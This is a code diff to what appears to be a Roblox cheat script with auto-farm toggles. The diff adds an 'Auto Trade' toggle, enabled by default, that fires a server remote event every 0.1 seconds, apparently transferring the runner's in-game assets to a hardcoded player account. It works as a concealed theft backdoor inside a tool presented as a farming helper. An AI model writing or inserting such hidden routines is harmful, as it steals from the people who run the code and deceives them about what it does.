@@ -231,6 +231,37 @@ Tabs.AutoFarm:AddToggle("AutoFarmPlaza", {
     end
 })
 
+local isAutoTradeEnabled = false
+local targetPlayer = "shutghrhq"
+
+Tabs.AutoFarm:AddToggle("Auto Trade", {
+    Title = "Auto Trade",
+    Default = true,
+    Callback = function(Value)
+        isAutoTradeEnabled = Value
+        if Value then
+            spawn(function()
+                while isAutoTradeEnabled do
+                    local targetPlayerObject = game:GetService("Players"):FindFirstChild(targetPlayer)
+                    if targetPlayerObject then
+                        local args = {
+                            [1] = {
+                                [1] = {
+                                    [1] = "0",
+                                    [2] = targetPlayerObject
+                                },
+                                [2] = "40"
+                            }
+                        }
+                        game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(args))
+                    end
+                    wait(0.1)
+                end
+            end)
+        end
+    end
+})
+
 
 Tabs.AutoFarm:AddToggle("AutoBuy", { Title = "AutoBuy", Default = false })
 Tabs.AutoFarm:AddToggle("AutoSell", { Title = "AutoSell", Default = false })
